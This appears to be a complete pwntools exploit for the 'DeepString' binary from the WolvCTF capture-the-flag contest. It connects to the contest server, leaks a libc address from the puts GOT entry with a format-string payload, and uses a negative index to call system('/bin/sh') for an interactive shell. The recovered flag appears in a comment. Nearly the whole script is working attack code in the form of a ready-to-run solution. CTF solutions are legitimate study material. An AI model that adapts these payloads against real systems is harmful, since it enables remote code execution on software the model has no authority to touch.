#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./DeepString_patched")
libc = ELF("./libc.6.so")

context.binary = exe

REMOTE_NC_CMD    = " nc deepstring.wolvctf.io 1337 "    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b reflect
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    payload = b"AAA%16$s" + p64(exe.sym.reflect) + p64(exe.got.puts)

    r.sendline(b"-37")
    r.sendline(payload)
    r.recvuntil(b"AAA")
    leak = u64(r.recv(6).ljust(8, b"\x00"))
    
    libc.address = leak - libc.sym.puts

    payload = b"/bin/sh\x00" + p64(libc.sym.system)

    r.sendline(b"-37")
    r.sendline(payload)


    r.interactive()
    #wctf{2in1!_tH3_4n5w3R_1S_42_bTw}

if __name__ == "__main__":
    main()